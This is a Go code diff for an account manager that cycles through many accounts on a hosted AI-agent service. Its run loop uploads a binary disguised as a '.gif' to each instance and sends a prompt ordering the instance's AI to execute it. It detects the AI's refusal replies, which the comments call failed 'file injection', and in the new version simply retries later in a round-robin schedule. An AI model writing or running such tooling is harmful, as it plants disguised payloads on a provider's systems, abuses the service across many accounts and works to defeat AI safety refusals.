@@ -20,7 +20,8 @@ type AccountManager struct {
 	rebuildCh      chan struct{}
 	rebuildVersion uint64
 	mu             sync.RWMutex
-	UserOrder      []string // ordered user IDs for stagger offset
+	UserOrder      []string // ordered user IDs for round-robin scheduling
+	nextUserIndex  int
 }
 
 var GlobalManager = &AccountManager{
@@ -28,6 +29,8 @@ var GlobalManager = &AccountManager{
 	LifecycleStops: make(map[string]chan struct{}),
 	rebuildCh:      make(chan struct{}),
 }
+
+const maxActiveLifecycleSlots = 4
 
 type waitSignal int
 
@@ -43,22 +46,10 @@ func (m *AccountManager) GetUsersCount() int {
 	return len(m.Users)
 }
 
-// staggerOffset returns seconds to subtract from wait time so accounts rotate at different times.
-// With N accounts and ~55min cycle, offset = index * (55*60 / N) to spread destruction evenly.
-func (m *AccountManager) staggerOffset(userID string) int {
+func (m *AccountManager) GetActiveUsersCount() int {
 	m.mu.RLock()
 	defer m.mu.RUnlock()
-	n := len(m.UserOrder)
-	if n <= 1 {
-		return 0
-	}
-	step := 3300 / n
-	for i, id := range m.UserOrder {
-		if id == userID {
-			return i * step
-		}
-	}
-	return 0
+	return len(m.LifecycleStops)
 }
 
 func (m *AccountManager) AddUser(rawText string) (string, error) {
@@ -94,16 +85,14 @@ func (m *AccountManager) AddUser(rawText string) (string, error) {
 		ServiceToken: st,
 		PH:           ph,
 		AddedAt:      float64(time.Now().Unix()),
-		Status:       "AVAILABLE",
-		RemainSec:    3600,
+		Status:       "QUEUED",
+		RemainSec:    0,
 	}
 
 	m.mu.Lock()
 	if oldStopCh, ok := m.LifecycleStops[user.UserID]; ok {
 		close(oldStopCh)
 	}
-	stopCh := make(chan struct{})
-	m.LifecycleStops[user.UserID] = stopCh
 	m.Users[user.UserID] = user
 
 	found := false
@@ -123,9 +112,77 @@ func (m *AccountManager) AddUser(rawText string) (string, error) {
 	data, _ := json.MarshalIndent(user, "", "  ")
 	os.WriteFile(filePath, data, 0644)
 
-	go m.runLifecycle(user, stopCh)
+	m.ensureActiveSlots()
 
 	return user.UserID, nil
+}
+
+type lifecycleLaunch struct {
+	user   models.UserRecord
+	stopCh chan struct{}
+}
+
+func (m *AccountManager) ensureActiveSlots() {
+	launches := m.reserveLifecycleSlots()
+	for _, launch := range launches {
+		go m.runLifecycle(launch.user, launch.stopCh)
+	}
+}
+
+func (m *AccountManager) reserveLifecycleSlots() []lifecycleLaunch {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+
+	if m.LifecycleStops == nil {
+		m.LifecycleStops = make(map[string]chan struct{})
+	}
+	if len(m.UserOrder) == 0 || len(m.LifecycleStops) >= maxActiveLifecycleSlots {
+		return nil
+	}
+
+	now := float64(time.Now().Unix())
+	launches := make([]lifecycleLaunch, 0, maxActiveLifecycleSlots-len(m.LifecycleStops))
+	for scanned := 0; len(m.LifecycleStops) < maxActiveLifecycleSlots && scanned < len(m.UserOrder); scanned++ {
+		if m.nextUserIndex >= len(m.UserOrder) {
+			m.nextUserIndex = 0
+		}
+		userID := m.UserOrder[m.nextUserIndex]
+		m.nextUserIndex = (m.nextUserIndex + 1) % len(m.UserOrder)
+
+		if _, active := m.LifecycleStops[userID]; active {
+			continue
+		}
+		user, ok := m.Users[userID]
+		if !ok {
+			continue
+		}
+
+		stopCh := make(chan struct{})
+		m.LifecycleStops[userID] = stopCh
+		user.Status = "SCHEDULED"
+		user.RemainSec = 0
+		user.LastRefresh = now
+		m.Users[userID] = user
+		launches = append(launches, lifecycleLaunch{user: user, stopCh: stopCh})
+	}
+
+	return launches
+}
+
+func (m *AccountManager) releaseLifecycleSlot(userID string, stopCh chan struct{}) {
+	m.mu.Lock()
+	if current, ok := m.LifecycleStops[userID]; ok && current == stopCh {
+		delete(m.LifecycleStops, userID)
+		if user, exists := m.Users[userID]; exists {
+			user.Status = "QUEUED"
+			user.RemainSec = 0
+			user.LastRefresh = float64(time.Now().Unix())
+			m.Users[userID] = user
+		}
+	}
+	m.mu.Unlock()
+
+	m.ensureActiveSlots()
 }
 
 func (m *AccountManager) TriggerRebuild() {
@@ -134,6 +191,8 @@ func (m *AccountManager) TriggerRebuild() {
 	close(m.rebuildCh)
 	m.rebuildCh = make(chan struct{})
 	m.mu.Unlock()
+
+	m.ensureActiveSlots()
 }
 
 func (m *AccountManager) currentRebuildState() (chan struct{}, uint64) {
@@ -192,12 +251,8 @@ func buildExecPrompt(user models.UserRecord) string {
 	)
 }
 
-func shouldReuseHealthyInstance(bootstrapPending bool, staggerRotationDue bool, targetRebuildVersion uint64, status string, remainSec int) bool {
-	return !bootstrapPending && !staggerRotationDue && targetRebuildVersion == 0 && status == "AVAILABLE" && remainSec > 180
-}
-
 // isRefusalReply 检测AI是否回复了拒绝性语句
-// 如果AI拒绝执行，说明文件注入没有成功，需要销毁实例并重建
+// 如果AI拒绝执行，说明文件注入没有成功，当前账号会释放调度 slot，等待之后轮询。
 func isRefusalReply(reply string) bool {
 	refusalKeywords := []string{
 		"抱歉",
@@ -218,27 +273,32 @@ func isRefusalReply(reply string) bool {
 	return false
 }
 
-func (m *AccountManager) runLifecycle(user models.UserRecord, stopCh <-chan struct{}) {
+func (m *AccountManager) updateUserRuntime(userID, status string, remainSec int) {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+
+	if u, ok := m.Users[userID]; ok {
+		u.Status = status
+		u.RemainSec = float64(remainSec)
+		u.LastRefresh = float64(time.Now().Unix())
+		m.Users[userID] = u
+	}
+}
+
+func (m *AccountManager) runLifecycle(user models.UserRecord, stopCh chan struct{}) {
 	payloadPath := "bridge/node-metrics-agent-linux-amd64.gif"
 	lastSeenRebuild := m.currentRebuildVersion()
-	bootstrapPending := false
-	staggerRotationDue := false
 	userLogf := func(format string, args ...interface{}) {
 		managerLogf("[manager:%s] %s", user.UserID, fmt.Sprintf(format, args...))
 	}
+	defer m.releaseLifecycleSlot(user.UserID, stopCh)
 
-outer:
 	for {
 		if isStopRequested(stopCh) {
 			return
 		}
 
-		targetRebuildVersion := uint64(0)
-		if currentVersion := m.currentRebuildVersion(); currentVersion > lastSeenRebuild {
-			targetRebuildVersion = currentVersion
-		}
-
-		userLogf("--- 开始新一轮实例生命周期 (轮换周期: 55 分钟) ---")
+		userLogf("--- 占用调度 slot，检查实例状态 ---")
 		client := NewNativeClawClient(user)
 
 		st, remainSec, err := client.GetInstanceStatus()
@@ -251,36 +311,16 @@ outer:
 			continue
 		}
 		userLogf("status: %s, remain_sec: %d", st, remainSec)
-
-		m.mu.Lock()
-		if u, ok := m.Users[user.UserID]; ok {
-			u.Status = st
-			u.RemainSec = float64(remainSec)
-			u.LastRefresh = float64(time.Now().Unix())
-			m.Users[user.UserID] = u
-		}
-		m.mu.Unlock()
-
-		// Ordinary healthy instances reuse their current cycle, unless we've reached
-		// a previously scheduled staggered rotation point.
-		if shouldReuseHealthyInstance(bootstrapPending, staggerRotationDue, targetRebuildVersion, st, remainSec) {
-			waitTime := time.Duration(remainSec-120) * time.Second
-			userLogf("发现可用实例 (remain=%ds)，继续休眠 %v...", remainSec, waitTime)
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, waitTime)
-			switch signal {
-			case waitSignalStop:
-				return
-			case waitSignalRebuild:
-				continue
-			case waitSignalExpired:
-			}
-			continue
-		}
+		m.updateUserRuntime(user.UserID, st, remainSec)
 
 		if st == "CREATING" {
 			userLogf("实例仍在创建中，30s 后重试状态检查...")
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 30*time.Second)
-			if signal == waitSignalStop {
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 30*time.Second)
+			if signal == waitSignalStop || signal == waitSignalRebuild {
+				if signal == waitSignalRebuild {
+					lastSeenRebuild = version
+					userLogf("收到重建/重排信号，释放当前 slot...")
+				}
 				return
 			}
 			continue
@@ -290,31 +330,40 @@ outer:
 			return
 		}
 
-		if bootstrapPending && st == "AVAILABLE" {
-			userLogf("检测到待初始化的新实例 (remain=%ds)，继续完成连接与部署...", remainSec)
-		} else {
-			if staggerRotationDue && st == "AVAILABLE" {
-				userLogf("已到达错峰轮换时间点 (remain=%ds)，开始重建当前实例...", remainSec)
-			}
-			staggerRotationDue = false
-			if st != "DESTROYED" {
-				userLogf("正在销毁当前实例...")
-				client.TryShutdownInstance(st)
-				client = NewNativeClawClient(user)
-				client.DestroyClaw()
-			}
-
-			bootstrapPending = true
-			userLogf("正在创建新实例...")
-			if err := client.CreateAndWait(); err != nil {
-				client.Close()
-				userLogf("实例创建失败: %v，等待 60s 后重试...", err)
-				signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
-				if signal == waitSignalStop {
+		if st == "AVAILABLE" {
+			if remainSec <= 180 {
+				waitTime := time.Duration(remainSec+30) * time.Second
+				if waitTime < 30*time.Second {
+					waitTime = 30 * time.Second
+				}
+				userLogf("实例即将自然到期 (remain=%ds)，等待 %v 后重新检查，不主动销毁...", remainSec, waitTime)
+				signal, version := m.waitForSignal(stopCh, lastSeenRebuild, waitTime)
+				if signal == waitSignalStop || signal == waitSignalRebuild {
+					if signal == waitSignalRebuild {
+						lastSeenRebuild = version
+						userLogf("收到重建/重排信号，释放当前 slot...")
+					}
 					return
 				}
 				continue
 			}
+			userLogf("发现可用实例 (remain=%ds)，开始连接与部署...", remainSec)
+		} else {
+			userLogf("正在创建新实例...")
+			if err := client.CreateAndWait(); err != nil {
+				client.Close()
+				userLogf("实例创建失败: %v，等待 60s 后重试...", err)
+				signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
+				if signal == waitSignalStop || signal == waitSignalRebuild {
+					if signal == waitSignalRebuild {
+						lastSeenRebuild = version
+						userLogf("收到重建/重排信号，释放当前 slot...")
+					}
+					return
+				}
+				continue
+			}
+			m.updateUserRuntime(user.UserID, "AVAILABLE", 0)
 		}
 
 		connected := false
@@ -334,12 +383,14 @@ outer:
 				break
 			}
 
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 5*time.Second)
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 5*time.Second)
 			switch signal {
 			case waitSignalStop:
 				return
 			case waitSignalRebuild:
-				continue outer
+				lastSeenRebuild = version
+				userLogf("收到重建/重排信号，释放当前 slot...")
+				return
 			case waitSignalExpired:
 			}
 
@@ -347,8 +398,12 @@ outer:
 		}
 		if !connected {
 			userLogf("实例连接全部失败，等待 60s 后重试整个生命周期...")
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
-			if signal == waitSignalStop {
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
+			if signal == waitSignalStop || signal == waitSignalRebuild {
+				if signal == waitSignalRebuild {
+					lastSeenRebuild = version
+					userLogf("收到重建/重排信号，释放当前 slot...")
+				}
 				return
 			}
 			continue
@@ -367,8 +422,12 @@ outer:
 		if err != nil {
 			userLogf("failed to upload payload: %v", err)
 			client.Close()
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
-			if signal == waitSignalStop {
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
+			if signal == waitSignalStop || signal == waitSignalRebuild {
+				if signal == waitSignalRebuild {
+					lastSeenRebuild = version
+					userLogf("收到重建/重排信号，释放当前 slot...")
+				}
 				return
 			}
 			continue
@@ -379,75 +438,69 @@ outer:
 		if err != nil {
 			userLogf("下发载荷执行失败: %v", err)
 			client.Close()
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
-			if signal == waitSignalStop {
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 60*time.Second)
+			if signal == waitSignalStop || signal == waitSignalRebuild {
+				if signal == waitSignalRebuild {
+					lastSeenRebuild = version
+					userLogf("收到重建/重排信号，释放当前 slot...")
+				}
 				return
 			}
 			continue
 		} else {
 			userLogf("deployment complete. AI reply: %s", reply)
-			// 检测AI是否拒绝执行，如果拒绝说明文件注入没有成功，需要销毁实例并重建
+			// 检测AI是否拒绝执行，如果拒绝说明文件注入没有成功，释放 slot 给下一个账号。
 			if isRefusalReply(reply) {
-				userLogf("检测到AI拒绝执行，文件注入可能未成功，销毁实例并重建...")
-				client.TryShutdownInstance("AVAILABLE")
-				client = NewNativeClawClient(user)
-				client.DestroyClaw()
-				signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 5*time.Second)
-				if signal == waitSignalStop {
-					return
-				}
-				continue
+				userLogf("检测到AI拒绝执行，文件注入可能未成功；不主动销毁，释放当前 slot...")
+				client.Close()
+				return
 			}
-		}
-		bootstrapPending = false
-
-		if targetRebuildVersion != 0 {
-			lastSeenRebuild = targetRebuildVersion
 		}
 
 		if currentVersion := m.currentRebuildVersion(); currentVersion > lastSeenRebuild {
-			userLogf("检测到新的重建请求，立即开始下一轮重建...")
+			lastSeenRebuild = currentVersion
+			userLogf("检测到新的重建/重排请求，释放当前 slot...")
 			client.Close()
-			continue
+			return
 		}
 
 		_, remainSecAfter, err := client.GetInstanceStatus()
 		if err != nil {
 			userLogf("部署后刷新实例状态失败: %v，10m 后重试检查...", err)
 			client.Close()
-			signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, 10*time.Minute)
-			if signal == waitSignalStop {
+			signal, version := m.waitForSignal(stopCh, lastSeenRebuild, 10*time.Minute)
+			if signal == waitSignalStop || signal == waitSignalRebuild {
+				if signal == waitSignalRebuild {
+					lastSeenRebuild = version
+					userLogf("收到重建/重排信号，释放当前 slot...")
+				}
 				return
 			}
 			continue
 		}
+		m.updateUserRuntime(user.UserID, "AVAILABLE", remainSecAfter)
 
-		waitOffset := 0
-		if targetRebuildVersion != 0 {
-			waitOffset = m.staggerOffset(user.UserID)
-		}
-
-		waitSec := remainSecAfter - 120 - waitOffset
+		waitSec := remainSecAfter - 120
 		if waitSec < 60 {
 			waitSec = 60
 		}
 		waitTime := time.Duration(waitSec) * time.Second
 
-		userLogf("部署完成 (remain=%ds, offset=%ds)，休眠 %v...", remainSecAfter, waitOffset, waitTime)
+		userLogf("部署完成 (remain=%ds)，休眠 %v 后释放 slot，轮询下一个账号...", remainSecAfter, waitTime)
 		client.Close()
-		signal, _ := m.waitForSignal(stopCh, lastSeenRebuild, waitTime)
-		if signal == waitSignalStop {
-			return
+		signal, version := m.waitForSignal(stopCh, lastSeenRebuild, waitTime)
+		if signal == waitSignalRebuild {
+			lastSeenRebuild = version
+			userLogf("收到重建/重排信号，释放当前 slot...")
 		}
-		if signal == waitSignalExpired && waitOffset > 0 {
-			staggerRotationDue = true
+		if signal == waitSignalStop || signal == waitSignalRebuild || signal == waitSignalExpired {
+			return
 		}
 	}
 }
 
 func (m *AccountManager) RemoveUser(userID string) {
 	m.mu.Lock()
-	defer m.mu.Unlock()
 
 	if stopCh, ok := m.LifecycleStops[userID]; ok {
 		close(stopCh)
@@ -462,9 +515,15 @@ func (m *AccountManager) RemoveUser(userID string) {
 			break
 		}
 	}
+	if m.nextUserIndex > len(m.UserOrder) {
+		m.nextUserIndex = 0
+	}
+	m.mu.Unlock()
 
 	filePath := filepath.Join("users", fmt.Sprintf("user_%s.json", userID))
 	os.Remove(filePath)
+
+	m.ensureActiveSlots()
 }
 
 func (m *AccountManager) GetUsersList() []models.UserRecord {
@@ -472,8 +531,17 @@ func (m *AccountManager) GetUsersList() []models.UserRecord {
 	defer m.mu.RUnlock()
 
 	var list []models.UserRecord
-	for _, user := range m.Users {
-		list = append(list, user)
+	seen := make(map[string]struct{}, len(m.Users))
+	for _, userID := range m.UserOrder {
+		if user, ok := m.Users[userID]; ok {
+			list = append(list, user)
+			seen[userID] = struct{}{}
+		}
+	}
+	for userID, user := range m.Users {
+		if _, ok := seen[userID]; !ok {
+			list = append(list, user)
+		}
 	}
 	return list
 }
